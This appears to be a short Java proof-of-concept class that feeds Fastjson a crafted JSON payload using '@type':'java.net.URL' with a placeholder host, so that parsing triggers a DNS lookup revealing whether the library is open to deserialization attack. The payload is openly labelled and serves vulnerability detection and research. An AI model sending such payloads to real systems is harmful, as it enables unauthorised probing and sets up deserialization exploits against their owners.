package com.security.bug.fastjson.dns;

import com.alibaba.fastjson.JSON;

/**

 */
public class URLPoc {

    public static void main(String[] args) {
        String payload = "{{\"@type\":\"java.net.URL\",\"val\":\"http://xxx.dns\"}:\"aaa\"}";
        try {
            JSON.parse(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
